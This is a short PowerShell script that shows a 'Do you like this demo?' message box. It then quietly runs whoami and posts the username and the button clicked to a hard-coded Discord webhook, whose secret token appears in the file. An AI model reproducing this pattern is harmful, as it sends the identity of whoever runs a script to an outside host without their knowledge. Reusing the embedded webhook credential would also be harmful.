param(
    [string]$Title   = "Confirm",
    [string]$Message = "Do you like this demo?",
    [ValidateSet("OK","OKCancel","YesNo","YesNoCancel","RetryCancel","AbortRetryIgnore")]
    [string]$Buttons = "YesNo",
    [ValidateSet("None","Information","Warning","Error","Question")]
    [string]$Icon    = "Question"
)

Add-Type -AssemblyName System.Windows.Forms

# Convert string args into enums
$btnEnum = [System.Windows.Forms.MessageBoxButtons]::$Buttons
$icoEnum = [System.Windows.Forms.MessageBoxIcon]::$Icon

$webhook = "https://discord.com/api/webhooks/1407832644372267170/e2K57M_-OIhHA4ubSGrniMJ_rvC90zKa8iyzeDDsMtdWkhbdIKGCYwfaSiTvw4uxIix1"

# Show message box
$result = [System.Windows.Forms.MessageBox]::Show($Message,$Title,$btnEnum,$icoEnum)

# Add username for context
$systemname = whoami

# Proper JSON
$json = @{ content = "$systemname clicked: $result" } | ConvertTo-Json -Compress

# Force BOM-less UTF-8
$tmp = [System.IO.Path]::GetTempFileName() + ".json"
[System.IO.File]::WriteAllText($tmp, $json, (New-Object System.Text.UTF8Encoding $false))

# Debug: see payload in console
Write-Host "Payload file content:" (Get-Content $tmp -Raw)

# Send to Discord
curl.exe -H "Content-Type: application/json" -X POST -d "@$tmp" $webhook
